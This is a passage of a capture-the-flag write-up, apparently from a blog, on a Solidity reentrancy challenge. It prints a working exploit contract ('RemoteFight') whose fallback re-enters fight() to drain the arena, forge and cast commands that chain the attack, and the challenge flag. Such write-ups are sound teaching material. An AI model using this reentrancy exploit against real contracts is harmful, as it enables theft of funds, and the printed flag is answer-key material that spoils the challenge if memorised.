+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(sent, <span style="color:#b2c98f">&#34;Arena: Failed to send prize&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    isFighting[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>At the start of <code>fight()</code>, if <code>isFighting[msg.sender]</code> is set to <code>false</code>, <code>prepareArena</code> will be called that just check if the arean has 0.6 ether or more.</p>
+<p>Then <code>isFighting[msg.sender]</code> is set to <code>true</code> and at the end of the fight, it is sets back to <code>false</code>.</p>
+<p>But arena calls an empty function when sending us ethers after winning, and in solidity, calling a function with no name is like calling a non-existent function. <br>
+So, in this case, the <code>fallback()</code> function is called on the destination contract. <br>
+If a <code>fallback()</code> function is defined, the instruction in the latter are executed, else the whole transaction is reverted. See <a href="https://rareskills.io/post/low-level-call-solidity">this</a>.</p>
+<p>Here is the process of sending ethers :</p>
+<pre tabindex="0"><code>                 send Ether
+                      |
+           msg.data is empty?
+                /           \
+            yes             no
+             |                |
+    receive() exists?     fallback()
+        /        \
+     yes          no
+      |            |
+  receive()     fallback()
+</code></pre><p>So when we win the fight, arena will send us ethers and call the <code>fallback()</code> function. We can define in the <code>fallback</code> function to call <code>fight()</code> again until there are no more ethers in the arena, and if we win again, the arena will triger <code>fallback</code> once more which will call <code>fight()</code> one more time and so on.</p>
+<p><img src="../../images/writeups/wwctf/reentrancy-cycle.png" alt="reentracy"></p>
+<p>Here is how it looks in solidity :</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">Evil.sol:RemoteFight</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">19</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;./Arena.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;./DinoPark.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> RemoteFight {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Arena <span style="color:#e67e80">public</span> arena;
+</span></span><span style="display:flex;"><span>    DinoPark <span style="color:#e67e80">public</span> dino;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">enum</span> FightMode { Normal, Ranked }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">address</span> _arena, <span style="color:#dbbc7f">address</span> _dino) <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        arena <span style="color:#7a8478">=</span> Arena(_arena);
+</span></span><span style="display:flex;"><span>        dino <span style="color:#7a8478">=</span> DinoPark(_dino);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">fightAndGuess</span>() <span style="color:#e67e80">public</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint8</span> guessRoll <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint8</span>(<span style="color:#dbbc7f">uint256</span>(<span style="color:#d699b6">keccak256</span>(<span style="color:#d699b6">abi</span>.<span style="color:#d699b6">encodePacked</span>(<span style="color:#d699b6">block</span>.<span style="color:#d699b6">timestamp</span>, <span style="color:#d699b6">block</span>.prevrandao))) <span style="color:#7a8478">%</span> <span style="color:#d699b6">100</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(guessRoll <span style="color:#7a8478">&lt;</span> <span style="color:#d699b6">31</span>, <span style="color:#b2c98f">&#34;roll too low to win!&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        arena.fight(guessRoll, Arena.FightMode.Normal);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fallback() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (<span style="color:#dbbc7f">address</span>(arena).<span style="color:#d699b6">balance</span> <span style="color:#7a8478">&gt;</span> <span style="color:#d699b6">1</span> <span style="color:#e67e80">wei</span>){
+</span></span><span style="display:flex;"><span>            fightAndGuess();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>We just have to create the contract, call <code>fightAndGuess()</code> and that&rsquo;s all.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>forge create Evil.sol:RemoteFight -r $RPC --root . --broadcast --private-key $PKEY --constructor-args $ARENA $SETUP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cast send &lt;deployed contract address&gt; -r $RPC --private-key $PKEY  <span style="color:#b2c98f">&#34;fightAndGuess()&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="../../images/writeups/wwctf/backstabbing-reentrancy.png" alt="backstabbing"></p>
+<p>Now we got all the step we just have to chain it all and then claim the egg to get the flag.</p>
+<h2 id="get-the-flag">Get the flag</h2>
+<p>We got this :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">#fund arena with 0.2ether</span>
+</span></span><span style="display:flex;"><span>forge create Evil.sol:Attack -r $RPC --root . --broadcast --private-key $PKEY --value 0.2ether --constructor-args $ARENA  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">#become a champion with our own address</span>
+</span></span><span style="display:flex;"><span>forge script script/BecomeChampion.s.sol:WinLottery --rpc-url $RPC --private-key $PKEY --broadcast --gas-limit <span style="color:#d699b6">10000000000000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">#create the evil contract for the reentrancy</span>
+</span></span><span style="display:flex;"><span>forge create Evil.sol:RemoteFight -r $RPC --root . --broadcast --private-key $PKEY --constructor-args $ARENA $SETUP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">#call fightAndGues that will trigger the reentrancy</span>
+</span></span><span style="display:flex;"><span>cast send &lt;deployed contract address&gt; -r $RPC --private-key $PKEY  <span style="color:#b2c98f">&#34;fightAndGuess()&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">#claim the egg</span>
+</span></span><span style="display:flex;"><span>cast send $ARENA -r $RPC --private-key $PKEY <span style="color:#b2c98f">&#34;claimGoldenEgg()&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After that we can get the flag</p>
+<p><code>wwf{r4pt0r_sl4y3r_3gg_hunt3r}</code></p>
+<h1 id="conclusion">Conclusion</h1>
+<p>forge script is goated ngl</p>
+<h1 id="references">References</h1>
+<ul>
+<li><a href="https://github.com/foundry-rs/foundry/issues/7456">https://github.com/foundry-rs/foundry/issues/7456</a></li>
+<li><a href="https://rareskills.io/post/low-level-call-solidity">https://rareskills.io/post/low-level-call-solidity</a></li>
+<li><a href="https://getfoundry.sh/guides/scripting-with-solidity">https://getfoundry.sh/guides/scripting-with-solidity</a></li>
+<li><a href="https://getfoundry.sh/reference/cheatcodes/overview">https://getfoundry.sh/reference/cheatcodes/overview</a></li>
+<li><a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#deactivate-and-self-destruct">https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#deactivate-and-self-destruct</a></li>
+</ul>
+
+</article>
+
+            </div>
+        </main>
+
+  
+    </body>
+</html>
